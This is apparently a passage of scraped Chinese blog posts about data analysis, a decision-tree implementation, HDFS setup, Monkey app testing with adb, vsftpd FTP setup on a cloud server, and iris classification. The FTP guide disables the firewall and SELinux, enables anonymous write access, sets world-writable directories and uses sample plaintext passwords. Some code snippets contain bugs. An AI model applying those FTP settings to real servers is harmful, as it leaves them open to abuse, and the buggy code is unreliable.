**kwargs)s：注释文本的内容xy：被注释的坐标点，二维元组形如(x,y)xytext：注释文本的坐标点，也是二维元组，默认与xy相同xycoords：被注释点的坐标系属性，允许输入的值如下'''for i in range(len(x)): if i&gt;0: plt.annotate(y[i], xy = (x[i],y[i]), xytext=(x[i]+0.05 -0.8/(y[i]-y[i-1]),y[i])) else: plt.annotate(y[i], xy = (x[i],y[i]), xytext=(x[i]+0.08,y[i])) # plt.annotate(y[i], xy = (x[i],y[i]))plt.show() #展示箱线图 123456789101112 销量count 200.000000mean 2755.214700std 751.029772min 22.00000025% 2451.97500050% 2655.85000075% 3026.125000max 9106.440000{'whiskers': [&lt;matplotlib.lines.Line2D object at 0x0000016973AA1F88&gt;, &lt;matplotlib.lines.Line2D object at 0x0000016974152088&gt;], 'caps': [&lt;matplotlib.lines.Line2D object at 0x0000016974158808&gt;, &lt;matplotlib.lines.Line2D object at 0x0000016974158C48&gt;], 'boxes': [&lt;matplotlib.lines.Line2D object at 0x0000016973AB4F08&gt;], 'medians': [&lt;matplotlib.lines.Line2D object at 0x0000016974158C88&gt;], 'fliers': [&lt;matplotlib.lines.Line2D object at 0x00000169741526C8&gt;], 'means': []}[1. 1. 1. 1. 1. 1. 1. 1.][51.0 865.0 22.0 60.0 6607.4 4060.3 9106.44 4065.2] 一致性分析…… 数据特征分析分布分析定量数据——频率分布表、频率分布直方图、茎叶图 定性数据——饼图、条形图 定量数据的分布分析 步骤： 求极差 决定组数和组距 决定分点 列出频率分布表 绘制频率分布直方图 原则： 各组之间必须相互排斥 各组必须将所有的数据包含在内 各组的组宽最好相等 习惯上将各组段设为左闭右开的半开区间 https://zhuanlan.zhihu.com/p/143589729 https://blog.csdn.net/weixin_37536446/article/details/82109431 123456789101112131415161718192021222324252627282930313233343536373839import pandas as pdimport numpy as npcatering_sale = '../data/catering_fish_congee.xls' #餐饮数据data = pd.read_excel(catering_sale, names=['data', 'sale']) # 读取数据，指定“日期” 列为索引# print(data)bins = [0, 500, 1000, 1500, 2000, 2500, 3000, 3500, 4000]labels = ['[0, 500]', '[500, 1000]', '[1000, 1500]', '[1500, 2000]', '[2000, 2500]', '[2500, 3000]', '[3000, 3500]', '[3500, 4000]']'''pd.cut( x, bins, right=True, labels=None, retbins=False, precision=3, include_lowest=False, duplicates='raise', )x ： 一维数组（对应前边例子中提到的销售业绩）bins ：整数，标量序列或者间隔索引，是进行分组的依据，如果填入整数n，则表示将x中的数值分成等宽的n份（即每一组内的最大值与最小值之差约相等）；如果是标量序列，序列中的数值表示用来分档的分界值如果是间隔索引，“ bins”的间隔索引必须不重叠right ：布尔值，默认为True表示包含最右侧的数值当“ right = True”（默认值）时，则“ bins”=[1、2、3、4]表示（1,2]，（2,3],（3,4]当bins是一个间隔索引时，该参数被忽略。labels : 数组或布尔值，可选.指定分箱的标签如果是数组，长度要与分箱个数一致，比如“ bins”=[1、2、3、4]表示（1,2]，（2,3],（3,4]一共3个区间，则labels的长度也就是标签的个数也要是3如果为False，则仅返回分箱的整数指示符，即x中的数据在第几个箱子里'''data['sale分层'] = pd.cut(data.sale, bins, labels=labels)# print(data['sale分层'])aggResult = data.groupby('sale分层')['sale'].agg([('sale', np.size)])# https://blog.csdn.net/icelights/article/details/108047815# print(data)print(aggResult)pAggResult = round(aggResult/aggResult.sum(), 2 ) * 100print(type(pAggResult))import matplotlib.pyplot as pltplt.figure(figsize=(10,6)) # 设置图框尺寸大小pAggResult['sale'].plot(kind='bar', width=0.8, fontsize=15) # 绘制频率直方图plt.rcParams['font.sans-serif'] = ['SimHei']plt.title(&quot;季度销售额频率直方图&quot;, fontsize=20)plt.show() 1234567891011 salesale分层 [0, 500] 28[500, 1000] 20[1000, 1500] 12[1500, 2000] 12[2000, 2500] 8[2500, 3000] 3[3000, 3500] 4[3500, 4000] 3&lt;class 'pandas.core.frame.DataFrame'&gt; 定性数据的分布分析 对于定性变量，常常根据变量的分类类型来分组，可以采用饼图和条形图来描述定性变量的分布 12345678910111213141516171819202122232425262728import pandas as pdimport matplotlib.pyplot as pltcatering_dish_profit = '../data/catering_dish_profit.xls' #餐饮菜品盈利数据data = pd.read_excel(catering_dish_profit,)# print(data)# 绘制饼图x = data['盈利']labels = data['菜品名']plt.figure(figsize=(8, 6))plt.pie(x, labels=labels)plt.rcParams['font.sans-serif'] = 'SimHei'plt.title('菜品销售量分布（饼图）')plt.axis('equal')plt.legend()plt.show()# 绘制条形图x = data['菜品名']y = data['盈利']plt.figure(figsize=(8, 4))plt.bar(x, y)plt.rcParams['font.sans-serif'] = 'SimHei'plt.xlabel('菜品')plt.ylabel('销量')plt.title('菜品销售量分布（条形图）')plt.show() 对比分析 绝对数比较 相对数比较 结构相对数：将同一总体内的部分数值与全部数值进行对比求得比重，用以说明事物的性质、结构或质量 比例相对数：将同一总体内不同部分的数值进行对比，表明总体内各部分的比例关系 比较相对数：将同一时期两个性质相同的指标数值进行对比，说明同类现象在不同空间条件下的数量对比关系 强度相对数：将两个性质不同但有一定联系的总量指标进行对比，用以说明现象的强度、密度和普遍程度 计划完成程度相对数：将某一时期实际完成数与计划数进行对比，用以说明计划完成程度 动态相对数：将同一现象在不同时期的指标数值进行对比，用以说明发展方向和变化速度 统计量分析 集中趋势度量 均值/加权均值 中位数 众数 离中趋势度量 极差 标准差 变异系数：度量标准差相对于均值的离中趋势$$CV = \\frac{s}{\\overline{x}}\\times100%$$","link":"/2021/08/11/python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"},{"title":"决策树算法python实现","text":"一、实验介绍​ 本实验基于python 3，进行决策树算法的实现及分类实验，参考《机器学习实战》第3章内容。 注：本次实验课程仅实现离散特征的决策树算法。 二、实验目标 准备数据，用python open函数或pandas实现数据的读取 实现计算数据集的熵entropy函数和gini函数。 根据某个特征取值，实现对数据集的划分 计算每个特征的信息增益或gini index，并选取最好的数据集划分特征 递归构建决策树 用pickle实现分类模型的存储 调用sklearn中的DecisionTreeClassifier实现本实验数据及鸢尾花的分类，并调用plot_tree进行分类模型的可视化 选做： 使用matplotlib绘制树形图。 三、实验过程 实验用到的python包 1234567891011121314import pandas as pdfrom math import logimport operatorimport pickleimport matplotlib.pyplot as pltfrom sklearn.tree import plot_treefrom sklearn.tree import DecisionTreeClassifierfrom sklearn.datasets import load_irisfrom sklearn.metrics import accuracy_scorefrom sklearn.model_selection import train_test_splitimport copyimport treePlotter 实现entropy函数和gini函数 12345678910111213def entropy(dataSet): numEntries = len(dataSet) labelCounts = {} for featVec in dataSet: currentLabel = featVec[-1] if currentLabel not in labelCounts.keys(): labelCounts[currentLabel] = 0 labelCounts[currentLabel] += 1 shannonEnt = 0.0 for key in labelCounts: prob = float(labelCounts[key]) / numEntries shannonEnt -= prob*log(prob, 2) return shannonEnt 123456789101112131415161718192021222324252627282930#gini函数def Ginix(data,n=0): m=len(data) n=len(data[0]) labelCounts ={} for featVec in data: currentLabel = featVec[-1] if currentLabel not in labelCounts.keys(): labelCounts[currentLabel] = 0 labelCounts[currentLabel] += 1 gini=[] for i in range(n): currentdict={} currentl=data[:,i] for i in currentl: if i not in currentdict.keys(): currentdict[i]=0 currentdict[i]+=1 imp = 0 for key1 in currentdict: p1 = float(currentdict[key1]) / m for key2 in currentdict: if key1==key2: continue p2 = float(currentdict[key2])/m imp+=p1*p2 gini.append(imp) return gini 按照指定特征划分数据集 123456789# 按照给定特征划分数据集def splitDataSet(dataset, axis, value): retDataSet = [] for featVec in dataset: if featVec[axis] == value: reducedFeatVec = featVec[:axis] reducedFeatVec.extend(featVec[axis+1:]) retDataSet.append(reducedFeatVec) return retDataSet 遍历整个数据集选择最好的划分方式 12345678910111213141516171819# 遍历整个数据集选择最好的划分方式def chooseBestFeatureToSplit(dataSet): numFeature = len(dataSet[0]) - 1 baseEntropy = entropy(dataSet) bestInfoGain = 0.0 bestFeature = -1 for i in range(numFeature): featList = [example[i] for example in dataSet] uniqueVals = set(featList) newEntropy = 0.0 for value in uniqueVals: subDataSet = splitDataSet(dataSet, i, value) prob = len(subDataSet) / float(len(dataSet)) newEntropy += prob * entropy(subDataSet) infoGain = baseEntropy - newEntropy if (infoGain &gt; bestInfoGain): bestInfoGain = infoGain bestFeature = i return bestFeature 实现构造决策树的算法 12345678910111213141516171819202122232425def majorityCnt(classList): classCount = [] for vote in classList: if vote not in classCount.keys(): classCount[vote] = 0 classCount[vote] += 1 sortedClassCount = sorted(classCount.iteritems(), key=operator.itemgetter(1), reverse=True) return sortedClassCount[0][0]def createTree(dataSet, labels): classList = [example[-1] for example in dataSet] if classList.count(classList[0]) == len(classList): # 所有类别完全相同则停止继续划分 return classList[0] # 返回分类结果 if len(dataSet[0]) == 1: # 若所有分类属性都分类结束，则用函数挑选出现次数最多的类别作为返回值 return majorityCnt(classList) bestFeat = chooseBestFeatureToSplit(dataSet) # 若上述情况都不满足，则调用最优分类函数 bestFeatLabel = labels[bestFeat] # 输出最优特征选择函数的属性名称 myTree = {bestFeatLabel: {}} # 创建递归树的字典 del (labels[bestFeat]) # 删除已经选择的属性标签 featValues = [example[bestFeat] for example in dataSet] uniqueVals = set(featValues) for value in uniqueVals: subLabels = labels[:] myTree[bestFeatLabel][value] = createTree(splitDataSet(dataSet, bestFeat, value), subLabels) return myTree 利用决策树算法实现分类 12345678910def classify(inputTree,featLabels,testVec):#使用决策树的分类函数来执行分类 firstStr = inputTree.keys()[0] secondDict = inputTree[firstStr] featIndex = featLabels.index(firstStr) for key in secondDict.keys(): if testVec[featIndex] == key: if type(secondDict[key]).__name__ == 'dict': classLabel = classify(secondDict[key],featLabels,testVec) else: classlabel = secondDict[key] return classLabel 分类结果： 12{'tearRate': {'normal': {'astigmatic': {'no': {'age': {'presbyopic': {'prescript': {'hyper': 'soft', 'myope': 'no lenses'}}, 'pre': 'soft', 'young': 'soft'}}, 'yes': {'prescript': {'hyper': {'age': {'presbyopic': 'no lenses', 'pre': 'no lenses', 'young': 'hard'}}, 'myope': 'hard'}}}}, 'reduced': 'no lenses'}} 使用pickle模块存储、输出决策树 123456789def storeTree(inputTree,filename): fw=open(filename,'wb') pickle.dump(inputTree,fw) fw.close()#使用pickle模块输出决策树def grabTree(filename): fr=open(filename,'rb') return pickle.load(fr) 将数据集划分为特征和标签 12345678910111213141516171819fr = open(&quot;lenses.txt&quot;) lenses = [inst.strip().split('\\t') for inst in fr.readlines()] lenses1 = copy.deepcopy(lenses) # print(lenses1) # print(len(lenses1)) # print('====') datadict = {'young':0, 'pre':1, 'presbyopic':2, 'myope':0, 'hyper':1, 'no':0, 'yes':1, 'reduced':1, 'normal':0, 'no lenses':0, 'soft':1, 'hard':2} for i in range(len(lenses1)): for j in range(5): lenses1[i][j] = datadict[lenses1[i][j]] print(lenses1) lenses2 = copy.deepcopy(lenses1) for i in range(len(lenses2)): del lenses2[i][-1] # print(lenses2) # print(lenses1) lensesLabels = ['age', 'prescript', 'astigmatic', 'tearRate'] lensesTree = createTree(lenses, lensesLabels) 利用matplotlib编写可视化决策树 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import matplotlib.pyplot as pltdecisionNode = dict(boxstyle=&quot;sawtooth&quot;, fc=&quot;0.8&quot;)leafNode = dict(boxstyle=&quot;round4&quot;, fc=&quot;0.8&quot;)arrow_args = dict(arrowstyle=&quot;&lt;-&quot;)def getNumLeafs(myTree): numLeafs = 0 firstStr = list(myTree.keys())[0] secondDict = myTree[firstStr] for key in secondDict.keys(): if type(secondDict[ key]).__name__ == 'dict': # test to see if the nodes are dictonaires, if not they are leaf nodes numLeafs += getNumLeafs(secondDict[key]) else: numLeafs += 1 return numLeafsdef getTreeDepth(myTree): maxDepth = 0 firstStr = list(myTree.keys())[0] secondDict = myTree[firstStr] for key in secondDict.keys(): if type(secondDict[ key]).__name__ == 'dict': # test to see if the nodes are dictonaires, if not they are leaf nodes thisDepth = 1 + getTreeDepth(secondDict[key]) else: thisDepth = 1 if thisDepth &gt; maxDepth: maxDepth = thisDepth return maxDepthdef plotNode(nodeTxt, centerPt, parentPt, nodeType): createPlot.ax1.annotate(nodeTxt, xy=parentPt, xycoords='axes fraction', xytext=centerPt, textcoords='axes fraction', va=&quot;center&quot;, ha=&quot;center&quot;, bbox=nodeType, arrowprops=arrow_args)def plotMidText(cntrPt, parentPt, txtString): xMid = (parentPt[0] - cntrPt[0]) / 2.0 + cntrPt[0] yMid = (parentPt[1] - cntrPt[1]) / 2.0 + cntrPt[1] createPlot.ax1.text(xMid, yMid, txtString, va=&quot;center&quot;, ha=&quot;center&quot;, rotation=30)def plotTree(myTree, parentPt, nodeTxt): # if the first key tells you what feat was split on numLeafs = getNumLeafs(myTree) # this determines the x width of this tree depth = getTreeDepth(myTree) firstStr = list(myTree.keys())[0] # the text label for this node should be this cntrPt = (plotTree.xOff + (1.0 + float(numLeafs)) / 2.0 / plotTree.totalW, plotTree.yOff) plotMidText(cntrPt, parentPt, nodeTxt) plotNode(firstStr, cntrPt, parentPt, decisionNode) secondDict = myTree[firstStr] plotTree.yOff = plotTree.yOff - 1.0 / plotTree.totalD for key in secondDict.keys(): if type(secondDict[ key]).__name__ == 'dict': # test to see if the nodes are dictonaires, if not they are leaf nodes plotTree(secondDict[key], cntrPt, str(key)) # recursion else: # it's a leaf node print the leaf node plotTree.xOff = plotTree.xOff + 1.0 / plotTree.totalW plotNode(secondDict[key], (plotTree.xOff, plotTree.yOff), cntrPt, leafNode) plotMidText((plotTree.xOff, plotTree.yOff), cntrPt, str(key)) plotTree.yOff = plotTree.yOff + 1.0 / plotTree.totalD# if you do get a dictonary you know it's a tree, and the first element will be another dictdef createPlot(inTree, name): fig = plt.figure(1, facecolor='white') fig.clf() axprops = dict(xticks=[], yticks=[]) createPlot.ax1 = plt.subplot(111, frameon=False, **axprops) # no ticks # createPlot.ax1 = plt.subplot(111, frameon=False) #ticks for demo puropses plotTree.totalW = float(getNumLeafs(inTree)) plotTree.totalD = float(getTreeDepth(inTree)) plotTree.xOff = -0.5 / plotTree.totalW; plotTree.yOff = 1.0; plotTree(inTree, (0.5, 1.0), '') # plt.savefig('13数据分布情况') plt.savefig(str(name)) plt.show() 利用sklearn中决策树算法实现给定数据集的分类 123456789101112Vecctor = [[0], [1], [0], [2], [0], [1], [0], [2], [0], [1], [0], [2], [0], [1], [0], [0], [0], [0], [0], [2], [0], [1], [0], [0]] X_train, X_test, Y_train, Y_test = train_test_split(lenses2, Vecctor, test_size=0.3, random_state=15) trees = DecisionTreeClassifier(criterion='entropy') trees = trees.fit(X_train, Y_train) # 训练 test_pre = trees.predict(X_test) # 预测 acc_glass = sum(test_pre == Y_test) / (len(Y_test)) print('predict:', test_pre) print('real label:', Y_test) print('实验数据分类结果:The accuracy is ', acc_glass) plt.figure(1) plot_tree(trees) plt.plot('glasses分类') 输出结果： 12345predict: [1 0 0 0 0 1 2 0]real label: [[0], [0], [0], [0], [0], [1], [2], [0]]实验数据分类结果:The accuracy is [0.125 0.75 0.75 0.75 0.75 0.125 0.125 0.75 ]predict: [0 1 1 0 0 1 2 1 1 2 2 1 1 1 2 0 1 2 0 1 1 0 1 2 0 0 2 2 2 1 0 2 1 2 0 0 2 0 0 1 2 0 0 1 2] 利用sklearn中决策树算法对iris数据集分类 12345678910111213141516171819202122#iris分类 iris = load_iris() # 特征 iris_feature = iris.data # 分类标签 iris_label = iris.target # 数据集划分 X_train, X_test, Y_train, Y_test = train_test_split(iris_feature, iris_label, test_size=0.3, random_state=15) clft = DecisionTreeClassifier() clft = clft.fit(X_train, Y_train) # 训练 y_test_pre = clft.predict(X_test) # 预测 # print(y_test_pre) num = iris_feature.shape[0] # 样本总数 num_train = X_train.shape[0] # 训练集样本数目 num_test = num - num_train # 测试集样本数目 acc = sum(y_test_pre == Y_test) / num_test print('predict:', y_test_pre) print('real label:', Y_test) print('iris分类结果:The accuracy is ', acc) plt.figure(2) plot_tree(clft) plt.show() 输出结果： 12345predict: [0 1 1 0 0 1 2 1 1 2 2 1 1 1 2 0 1 2 0 1 1 0 1 1 0 0 2 2 2 1 0 2 1 2 0 0 2 0 0 1 2 0 0 1 2]real label: [0 1 1 0 0 1 2 1 1 2 2 1 1 1 2 0 1 2 0 2 1 0 1 1 0 0 2 2 2 1 0 2 1 2 0 0 2 0 0 1 2 0 0 1 2]iris分类结果:The accuracy is 0.9777777777777777 四、实验总结和体会算法定义决策树：是一种监督学习(Supervised Learning)方法，通过不断对某个属性进行判断得到一个分支最终形成决策树，这个决策树能够对新的数据进行正确的分类。代表算法：ID3，C4.5损失函数：正则化的极大似然函数 算法流程将所有特征看成一个一个的节点。分割每个特征，找到最好的分割点；将数据划分为不同的子节点，N1、N2、…、Nm，计算子节点的纯度信息；由2步选择出最优的特征和划分方式；得出子节点：N1、N2、…、Nm，；对于N1、N2、…、Nm，继续执行2~3步，直到每个最终子节点都足够。流程如下： 12345678If so return 类标签：Else 寻找划分数据集的最好特征 划分数据集 创建分支节点 for 每个划分的子集 调用函数createBranch()并增加返回结果到分支节点中 return 分支节点 特征选择目的：选取能够对训练集分类的特征。标准：信息增益，信息增益比，Gini 指数；特征选择方法：通过数据集进行划分，计算划分前后信息发生的变化，变化最高的就是最好的选择。 树的生成特征选择：选取信息增益最大、信息增益比最大、Gini 指数最小的特征。生成过程：从根节点开始，不断选取局部最优特征；树的生成方法(ID3算法)：在决策树各个结点上对应信息增益准则选择特征，递归地构建决策树。从根结点开始，对结点计算所有可能的特征的信息增益，选择信息增益最大的特征作为结点的特征。由该特征的不同取值建立子节点，再对子结点递归地调用以上方法，构建决策树；直到所有特征的信息增益均很小或没有特征可以选择为止；最后得到一个决策树。 树的剪枝目的：决策树的剪枝是为了防止树的过拟合，增强其泛化能力。步骤：预剪枝和后剪枝。 算法优缺点优点 使用可视化模型。 很容易理解和解释。 可以与其他决策技术结合使用。 即使只有很少的数据也有价值。 可以基于分析得出的情况生成确定不同方案的最差，最佳和预期值。 缺点 它们是不稳定的，这意味着数据的微小变化可能导致最优决策树结构的巨大变化。 它们通常相对不准确。许多其他预测因子使用类似数据表现更好。 对于包括具有不同级别数的分类变量的数据，决策树中的信息增益偏向于具有更多级别的那些属性。 计算可能变得非常复杂，特别是如果许多值不确定和/或许多结果是相关的。 参考资料：https://blog.csdn.net/weixin_43973436/article/details/106751198","link":"/2021/11/19/%E5%86%B3%E7%AD%96%E6%A0%91%E7%AE%97%E6%B3%95python%E5%AE%9E%E7%8E%B0/"},{"title":"分布式HDFS的配置","text":"一、分布式HDFS的安装与启动 1.在$HADOOP_HOME/etc/hadoop/core-site.xml文件 12345678910&lt;property&gt; &lt;name&gt;fs.defaultsFS&lt;/name&gt; &lt;!-- 告知NN在哪个机器上，NN使用哪个端口号接收客户端和DN的RPC请求--&gt; &lt;value&gt;hdfs://hadoop100:9000&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/opt/module/hadoop-2.7.2/data/tmp&lt;/value&gt;&lt;/property&gt;&lt;/configuration&gt; 2.格式化NameNode（只需要格式化一次） 命令： hadoop namenode -format 目的： 1.生成/opt/module/hadoop-2.7.2/data/tmp目录 ​ 2.在目录中生成fsimage_0000000000000000000文 件 3.启动NameNode hadoop-daemon.sh start namenode 启动datenode hadoop-daemon.sh start datenode 4.查看 ​ JPS ​ 通过浏览器访问 http:// nn所在的主机名(或ip) :50070 举例： hadoop fs -put hello / 此文件系统与Linux文件系统并无关系","link":"/2021/10/01/%E5%88%86%E5%B8%83%E5%BC%8FHDFS%E7%9A%84%E9%85%8D%E7%BD%AE/"},{"title":"利用Monkey进行APP测试","text":"APP测试策略 功能测试 安装、卸载测试 升级测试（跨版本） 数据丢失 版本兼容 业务逻辑测试 UI测试 异常测试 适配测试 软件 兼容性测试 硬件 性能测试 效率测试 启动时间 响应时间 页面流畅度 极限测试 在各种边界压力情况下，电池存储网速 能否正确响应 内存满时安装APP 运行时手机断电 运行APP时断掉网络 压力测试 反复/长期操作下，系统资源是否占用异常 反复安装卸载 其他功能反复使用 专项测试 电量电流测试or耗电测试 正向耗电 逆向耗电 后台耗电 流量测试 流量占用 后台流量 内存泄漏测试 内存占用 内存泄漏 内存不足时的情景 网络专项测试 蓝牙专项测试 SIM卡专项 T卡专项 安全性测试 应用程序级别安全性，包括对数据或业务功能的访问 系统级别的安全性，包括对系统的登录或远程访问 稳定性测试 在一定负载下长时间运行后的表现 一般使用工具 monkey 稳定性测试 指软件长时间的持续运行，系统版本是否稳定，能否持续的为用户提供服务 指标： 异常的次数 参考数据 同类型软件的数据，前一次数据进行参考 异常的频率 APP的稳定性测试如何实施？ 首选monkey monkey是系统发送随机的用户事件流（如按键输入、触摸屏输入和手势输入等），实现对正在开发的应用程序进行稳定性测试，可以更好的模拟用户操作，确保APP的稳定性 monkey操作 网易mumu模拟器端口号：7555 adb connect 127.0.0.1:7555 模拟器安装apk apk放入adb系统文件夹进入cmd adb install 2048.apk adb devices 手机设备：显示设备的序列号 模拟器：显示ip地址和端口 即127.0.0.1:7555 device：已识别的设备，连接成功 unauthorized：没有授权，需要手机上授权后才能连接 unknown：未识别的设备 offline：离线设备 命令 基本参数 调试参数 事件参数 必填项 COUNT事件数 查看软件包 adb shell pm list packages -3 对指定软件进行操作 adb shell monkey -p com.nelease.cloudmusic 100 每次操作后间隔1s adb shell monkey -p com.xzgdjt.smartmetro --throttle 1000 100 设置时间需要对次数进行转化 日志设置： -v： level0 除启动提示、测试完成和最终结果之外，提供较少信息 -v-v：level1 提供较为详细的测试信息，如逐个发送到Activity的事件 -v-v-v：level2 提供更加详细的设置信息 如测试中被选中或未被选中的Activity 123adb shell monkey -p com.wuba -v 100adb shell monkey -p com.wuba -v-v 100adb shell monkey -p com.wuba -v-v-v 100 日志导出到本地 1adb shell monkey -p com.wuba -v 100 &gt;d:\\wuba.txt 指定sed值 adb shell monkey -p com.xzgdjt.smartmetro -s 1001 --throttle 1000 100","link":"/2022/01/27/%E5%88%A9%E7%94%A8Monkey%E8%BF%9B%E8%A1%8CAPP%E6%B5%8B%E8%AF%95/"},{"title":"利用阿里云ECS搭建FTP服务器","text":"目标： 别的用户可以利用ftp协议访问IP，通过登录指定用户实现文件的上传 本地可以通过登录管理员用户，实现文件的上传和下载 之后更新： 监控anonymous用户上传文件的大小，超过，则发邮件告警并阻止传输 anonymous用户监控 开放阿里云端口开放阿里云ECS服务器20,21端口 安装ftp服务器软件安装vsftpd（very secure fast ftp daemon) 1yum install -y vsftpd 查看vsftp依赖源 1rpm -ql vsftpd 1234567/etc/logrotate.d/vsftpd/etc/pam.d/vsftpd/etc/vsftpd/etc/vsftpd/ftpusers/etc/vsftpd/user_list/etc/vsftpd/vsftpd.conf/etc/vsftpd/vsftpd_conf_migrate.sh /etc/vsftpd/vsftpd.conf 是核心配置文件。 /etc/vsftpd/ftpusers 是黑名单文件，此文件里的用户不允许访问 FTP 服务器。 /etc/vsftpd/user_list 是白名单文件，是允许访问 FTP 服务器的用户列表。 启动vsftpd服务 123systemctl start vsftpd.servicesystemctl status vsftpd.servicesystemctl enable vsftpd.service 查看端口 1netstat -antup | grep ftp 查看防火墙，需关闭 1systemctl status firewalld.service 查看selinux，需关闭 12getenforce getenforce 0 此时打开Windows DOS窗口输入 1ftp ip地址 显示 1234连接到 IP地址220 (vsFTPd 3.0.2)200 Always in UTF8 mode.用户(ip地址:(none)): 此时可以用匿名用户 anonymous登录，不需要密码 123456789331 Please specify the password.密码：230 Login successful.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listingpubftp&gt; put test.txtftp&gt; get test.txt 如果在cmd中可以打开，但是在Windows地址栏本地被拒绝访问，则可能是系统设置问题 控制面板——程序——打开或关闭Windows功能——(FTP服务器——勾选‘FTP服务’和‘FTP扩展性’)——勾选TFTP客户端 更改Internet属性：打开‘Internet选项’——高级——取消勾选‘使用被动FTP(用于防火墙和DSL调制解调器的兼容)”并点击确定 检查IE浏览器是否处于“脱机”状态，打开“Internet选项”，选择“连接”选项卡，打开“设置”——勾选“自动检测设置”并点击确定 点击打开“局域网设置”——勾选其中的“自动检测设置”，并点击确定 控制面板中进入系统和安全——Windows防火墙——允许程序通过Windows防火墙——确认“Windows 资源管理器”右侧的两个勾选——如果没有勾选则点击上方的“更改设置” 给pub文件增加读权限 cp /etc/vsftpd/vsftpd.conf{,.bak}grep -Ev ‘#’ vsftpd.conf touch data +%F.txt grep 1chmod o+w pub 匿名用户访问(默认开启)/etc/vsftpd/vsftpd.conf 12345anonymous_enable=YES anon_upload_enable=YES # 是否允许上传 anon_umask=022 # 传用户umask值 anon_mkdir_write_enable=yes # 创建目录anon_other_write_enable=yes # 重命名其他文件 1no_anon_password=YES(NO) 当设置为YES时，表示anonymous将会略过密码检验步骤，而直接进入vsftpd服务器内。所以一般默认都是NO（登录时会检查输入的email） 加入了这个配置之后，就能够直接登录FTP查看文件，不会出现需要输入用户名和密码那一个框了。 12more /etc/passwd |grep ftpchmod 755 /var/ftp # 不能是777 vsftp匿名用户无法上传文件 anon_root=/var/ftp/pub 在/var/ftp中建立一个upload文件夹，将个文件夹权限设置为777，在upload这个文件夹中，匿名用户可以上传文件、创建文件夹、删除文件等 本地用户访问使用本地用户登陆成功时位置在家目录的位置 123456789101112131415161718192021[root@localhost ~]# vi /etc/vsftpd/vsftpd.confanonymous_enable=NOlocal_enable=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=NOlisten_ipv6=YESpam_service_name=vsftpduserlist_enable=YEStcp_wrappers=YES[root@localhost ~]# systemctl restart vsftpd[root@localhost ~]# systemctl enable vsftpd注意：出现在/etc/vsftpd/ftpuser 中的内容将会被定义为黑名单/etc/vsftpd/user_listuserlist_deny=NO 白名单userlist_deny=YES 黑名单 默认 虚拟用户访问 创建用于进行FTP认证的用户数据库文件，其中奇数行为账户名，偶数行为密码。 1234567[root@localhost ~]# cd /etc/vsftpd/[root@localhost vsftpd]# vi vuser.list自定义ciscocentoshuaweicentos 使用db_load命令用哈希（hash）算法将原始的明文信息文件转换成数据库文件 降低数据库文件的权限（避免其他人看到数据库文件的内容） 把原始的明文信息文件删除。 12345[root@localhost vsftpd]# db_load -T -t hash -f vuser.list vuser.db[root@localhost vsftpd]# file vuser.dbvuser.db: Berkeley DB (Hash, version 9, native byte-order)[root@localhost vsftpd]# chmod 600 vuser.db[root@localhost vsftpd]# rm -f vuser.list 创建一个本地用户，用来做虚拟用户在本地的代理，为了安全起见，禁止这个本 地用户登录 1234[root@localhost vsftpd]# useradd -d /var/ftproot -s /sbin/nologin virtualuser[root@localhost vsftpd]# ls -ld /var/ftproot/drwx------. 2 virtual virtual 59 8月 10 23:04 /var/ftproot/[root@localhost vsftpd]# chmod -Rf 777 /var/ftproot/ 新建一个用于虚拟用户认证的PAM文件vsftpd.vu 123[root@localhost vsftpd]# vim /etc/pam.d/vsftpd.vuauth required pam_userdb.so db=/etc/vsftpd/vuseraccount required pam_userdb.so db=/etc/vsftpd/vuser 配置文件 123456789101112131415161718[root@localhost vsftpd]# cat /etc/vsftpd/vsftpd.confanonymous_enable=NOlocal_enable=YESguest_enable=YESguest_username=virtualallow_writeable_chroot=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=NOlisten_ipv6=YESpam_service_name=vsftpd.vu # zhuyi userlist_enable=YEStcp_wrappers=YES[root@localhost vsftpd]# 如果想要针对不同的用户设置不同的权限 123456789101112131415161718192021222324252627[root@localhost vsftpd]# mkdir /etc/vsftpd/vusers_dir/[root@localhost vsftpd]# cd /etc/vsftpd/vusers_dir/[root@localhost vusers_dir]# touch huawei[root@localhost vusers_dir]# vi eagleanon_upload_enable=YESanon_mkdir_write_enable=YESanon_other_write_enable=YES[root@localhost vusers_dir]#[root@localhost vusers_dir]# vi /etc/vsftpd/vsftpd.confanonymous_enable=NOlocal_enable=YESguest_enable=YESguest_username=virtualallow_writeable_chroot=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESxferlog_std_format=YESlisten=NOlisten_ipv6=YESpam_service_name=vsftpd.vuuserlist_enable=YEStcp_wrappers=YESuser_config_dir=/etc/vsftpd/vusers_dir[root@localhost vusers_dir]# systemctl restart vsftpd","link":"/2021/09/30/%E5%88%A9%E7%94%A8%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%90%AD%E5%BB%BAFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"基于前馈神经网络对iris数据集分类","text":"分类问题（3类，数据网站有数据的详细描述） 数据源http://archive.ics.uci.edu/ml/datasets/Iris 用BP算法训练单隐层前馈神经网络，实现Iris数据分类 数据划分：训练和测试数据集划分参考网站上论文的划分 sklearn.datasets中含有iris的数据集 加载iris数据集并显示数据集格式 123from sklearn.datasets import load_irisiris = load_iris()print(iris) 数据集格式：观察结构为字典，存储在iris中 {‘data’: array([[5.1, 3.5, 1.4, 0.2], ​ [4.9, 3. , 1.4, 0.2], ​ [4.7, 3.2, 1.3, 0.2], ​ [4.6, 3.1, 1.5, 0.2], …… ​ [5.9, 3. , 5.1, 1.8]]), ‘target’: array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ​ 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ​ 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 